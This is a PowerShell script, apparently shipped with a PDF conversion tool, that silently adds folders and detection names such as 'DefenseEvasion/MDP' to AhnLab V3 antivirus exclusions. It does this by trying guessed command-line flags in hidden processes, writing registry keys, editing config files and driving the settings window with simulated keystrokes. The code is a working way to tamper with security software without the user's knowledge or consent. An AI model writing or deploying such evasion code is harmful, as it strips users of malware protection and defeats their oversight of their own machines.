# HanToPdf — AhnLab V3 검사 예외 자동 등록 (사용자 UI 없음)
param(
    [Parameter(Mandatory = $true)]
    [string[]]$Paths,
    [string]$ExePath = "",
    [string]$LogPath = ""
)

$ErrorActionPreference = 'SilentlyContinue'

$MdpNames = @(
    'DefenseEvasion/MDP.Event.M1423',
    'DefenseEvasion/MDP'
)

function Write-TrustLog {
    param([string]$Message)
    if (-not $LogPath) { return }
    try {
        $dir = Split-Path -Parent $LogPath
        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        $line = "[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message
        Add-Content -LiteralPath $LogPath -Value $line -Encoding UTF8
    } catch {}
}

function Find-V3Directory {
    $roots = @(
        ${env:ProgramFiles} + '\AhnLab',
        ${env:ProgramFiles(x86)} + '\AhnLab'
    )
    foreach ($root in $roots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        $cfg = Get-ChildItem -LiteralPath $root -Recurse -Filter 'v3l4cfg.exe' -ErrorAction SilentlyContinue |
            Select-Object -First 1
        if ($cfg) { return $cfg.DirectoryName }
    }
    return $null
}

function Invoke-V3CliExclude {
    param([string]$V3Dir, [string[]]$FolderPaths)
    $cli = Join-Path $V3Dir 'v3l4cli.exe'
    if (-not (Test-Path -LiteralPath $cli)) { return $false }

    $ok = $false
    foreach ($folder in $FolderPaths) {
        $attempts = @(
            @('/AddExcludeFolder', $folder),
            @('-AddExcludeFolder', $folder),
            @('/ADD_EXCLUDE_PATH', $folder),
            @('/SetOption', 'ExcludeFolder', $folder),
            @('/excludefolder', $folder),
            @('/ADDSCANEXCLUDE', 'FOLDER', $folder),
            @('/ADD_SCAN_EXCLUDE', $folder)
        )
        foreach ($args in $attempts) {
            $proc = Start-Process -FilePath $cli -ArgumentList $args -WindowStyle Hidden -PassThru -Wait
            if ($proc.ExitCode -eq 0) {
                Write-TrustLog "v3l4cli 성공: $($args -join ' ')"
                $ok = $true
            }
        }
    }
    return $ok
}

function Add-RegistryStringList {
    param(
        [string]$KeyPath,
        [string]$ValueName,
        [string]$NewItem
    )
    if (-not (Test-Path -LiteralPath $KeyPath)) { return $false }
    try {
        $existing = (Get-ItemProperty -LiteralPath $KeyPath -Name $ValueName -ErrorAction SilentlyContinue).$ValueName
        $list = @()
        if ($existing) {
            if ($existing -is [array]) { $list = @($existing) } else { $list = @([string]$existing) }
        }
        foreach ($item in $list) {
            if ([string]::Equals($item, $NewItem, [System.StringComparison]::OrdinalIgnoreCase)) {
                return $true
            }
        }
        $list += $NewItem
        Set-ItemProperty -LiteralPath $KeyPath -Name $ValueName -Value $list -Type MultiString
        Write-TrustLog "레지스트리 추가: $KeyPath\$ValueName <- $NewItem"
        return $true
    } catch {
        return $false
    }
}

function Try-RegistryExclude {
    param([string[]]$FolderPaths, [string[]]$MalwareNames)
    $ok = $false
    $roots = @(
        'HKCU:\SOFTWARE\AhnLab',
        'HKCU:\SOFTWARE\Ahnlab',
        'HKLM:\SOFTWARE\AhnLab',
        'HKLM:\SOFTWARE\Ahnlab'
    )

    foreach ($root in $roots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        $keys = Get-ChildItem -LiteralPath $root -Recurse -ErrorAction SilentlyContinue
        foreach ($key in $keys) {
            $path = $key.PSPath
            $name = $key.PSChildName
            if ($name -match 'Exclude|Except|ScanEx|White|Trust') {
                foreach ($folder in $FolderPaths) {
                    foreach ($vn in @('Folder', 'Folders', 'Path', 'Paths', 'ExcludeFolder', 'ExcludePath', 'ScanExclude')) {
                        if (Add-RegistryStringList -KeyPath $path -ValueName $vn -NewItem $folder) { $ok = $true }
                    }
                }
                foreach ($mal in $MalwareNames) {
                    foreach ($vn in @('Malware', 'MalwareName', 'Threat', 'ThreatName', 'VirusName', 'ScanExcludeMalware')) {
                        if (Add-RegistryStringList -KeyPath $path -ValueName $vn -NewItem $mal) { $ok = $true }
                    }
                }
            }
        }
    }

    $known = @(
        'HKCU:\SOFTWARE\AhnLab\V3Lite\ScanExclude',
        'HKCU:\SOFTWARE\AhnLab\V3Lite40\ScanExclude',
        'HKCU:\SOFTWARE\Ahnlab\V3Lite4\ScanExclude',
        'HKCU:\SOFTWARE\AhnLab\V3Lite\UserPolicy',
        'HKCU:\SOFTWARE\AhnLab\V3Lite40\UserPolicy'
    )
    foreach ($keyPath in $known) {
        if (-not (Test-Path -LiteralPath $keyPath)) {
            try { New-Item -Path $keyPath -Force | Out-Null } catch { continue }
        }
        foreach ($folder in $FolderPaths) {
            if (Add-RegistryStringList -KeyPath $keyPath -ValueName 'Folder' -NewItem $folder) { $ok = $true }
            if (Add-RegistryStringList -KeyPath $keyPath -ValueName 'Folders' -NewItem $folder) { $ok = $true }
            if (Add-RegistryStringList -KeyPath $keyPath -ValueName 'Enable' -NewItem '1') { $ok = $true }
        }
        foreach ($mal in $MalwareNames) {
            if (Add-RegistryStringList -KeyPath $keyPath -ValueName 'MalwareName' -NewItem $mal) { $ok = $true }
        }
    }
    return $ok
}

function Try-ProgramDataConfig {
    param([string[]]$FolderPaths)
    $ok = $false
    $roots = @(
        Join-Path $env:ProgramData 'AhnLab',
        Join-Path $env:ProgramData 'Ahnlab',
        Join-Path $env:LOCALAPPDATA 'AhnLab'
    )
    foreach ($root in $roots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        $files = Get-ChildItem -LiteralPath $root -Recurse -Include '*.ini', '*.xml', '*.cfg', '*.pol' -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $name = $file.Name.ToLower()
            if ($name -notmatch 'exclude|except|user|policy|setting|custom') { continue }
            try {
                $text = Get-Content -LiteralPath $file.FullName -Raw -Encoding UTF8
                if ($text -notmatch 'Exclude|Except|ScanEx') { continue }
                $changed = $false
                foreach ($folder in $FolderPaths) {
                    if ($text -notlike "*$folder*") {
                        $text += "`r`nExcludeFolder=$folder`r`n"
                        $changed = $true
                    }
                }
                if ($changed) {
                    Set-Content -LiteralPath $file.FullName -Value $text -Encoding UTF8
                    Write-TrustLog "설정 파일 갱신: $($file.FullName)"
                    $ok = $true
                }
            } catch {}
        }
    }
    return $ok
}

function Try-UiAutomationExclude {
    param([string]$V3Dir, [string[]]$FolderPaths)
    $cfg = Join-Path $V3Dir 'v3l4cfg.exe'
    if (-not (Test-Path -LiteralPath $cfg)) { return $false }

  try {
        Add-Type -AssemblyName UIAutomationClient
        Add-Type -AssemblyName UIAutomationTypes
        Add-Type -AssemblyName System.Windows.Forms
    } catch {
        return $false
    }

    $proc = Start-Process -FilePath $cfg -WindowStyle Minimized -PassThru
  if (-not $proc) { return $false }
    Start-Sleep -Seconds 2

    $root = [System.Windows.Automation.AutomationElement]::RootElement
    $cond = New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::ProcessIdProperty, $proc.Id)
    $window = $root.FindFirst([System.Windows.Automation.TreeScope]::Children, $cond)
    if (-not $window) {
        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
        return $false
    }

    $ok = $false
    try {
        $treeCond = New-Object System.Windows.Automation.OrCondition(
            (New-Object System.Windows.Automation.PropertyCondition(
                [System.Windows.Automation.AutomationElement]::NameProperty, '검사 예외 설정')),
            (New-Object System.Windows.Automation.PropertyCondition(
                [System.Windows.Automation.AutomationElement]::NameProperty, '검사 예외'))
        )
        $item = $window.FindFirst([System.Windows.Automation.TreeScope]::Descendants, $treeCond)
        if ($item) {
            $invoke = $item.GetCurrentPattern([System.Windows.Automation.SelectionItemPattern]::Pattern)
            if ($invoke) { $invoke.Select() }
        }

        foreach ($folder in $FolderPaths) {
            $btnCond = New-Object System.Windows.Automation.PropertyCondition(
                [System.Windows.Automation.AutomationElement]::NameProperty, '폴더 추가')
            $btn = $window.FindFirst([System.Windows.Automation.TreeScope]::Descendants, $btnCond)
            if (-not $btn) { continue }
            $click = $btn.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern)
            if ($click) { $click.Invoke() }
            Start-Sleep -Milliseconds 600
            [System.Windows.Forms.SendKeys]::SendWait($folder)
            Start-Sleep -Milliseconds 200
            [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
            Start-Sleep -Milliseconds 400
            $ok = $true
        }

        foreach ($name in @('적용', '확인', 'OK')) {
            $applyCond = New-Object System.Windows.Automation.PropertyCondition(
                [System.Windows.Automation.AutomationElement]::NameProperty, $name)
            $apply = $window.FindFirst([System.Windows.Automation.TreeScope]::Descendants, $applyCond)
            if ($apply) {
                $p = $apply.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern)
                if ($p) { $p.Invoke(); break }
            }
        }
    } catch {
        Write-TrustLog "UI 자동화 실패: $($_.Exception.Message)"
    } finally {
        if (-not $proc.HasExited) {
            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
        }
    }
    if ($ok) { Write-TrustLog 'V3 UI 자동 예외 등록 시도 완료' }
    return $ok
}

$uniquePaths = @($Paths | Where-Object { $_ } | Select-Object -Unique)
if ($uniquePaths.Count -eq 0) { exit 0 }

Write-TrustLog ("안랩 예외 등록 시작: " + ($uniquePaths -join '; '))

$v3Dir = Find-V3Directory
if (-not $v3Dir) {
    Write-TrustLog 'AhnLab V3 미설치 — 스킵'
    exit 0
}

Write-TrustLog "V3 경로: $v3Dir"

$any = $false
if (Invoke-V3CliExclude -V3Dir $v3Dir -FolderPaths $uniquePaths) { $any = $true }
if (Try-RegistryExclude -FolderPaths $uniquePaths -MalwareNames $MdpNames) { $any = $true }
if (Try-ProgramDataConfig -FolderPaths $uniquePaths) { $any = $true }
if (-not $any) {
    if (Try-UiAutomationExclude -V3Dir $v3Dir -FolderPaths $uniquePaths) { $any = $true }
}

if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
    Write-TrustLog "exe 해시 예외는 V3 UI/정책으로만 등록 가능: $ExePath"
}

if ($any) { Write-TrustLog '안랩 예외 등록 시도 완료' } else { Write-TrustLog '안랩 예외 등록 방법 적용 실패' }
exit 0
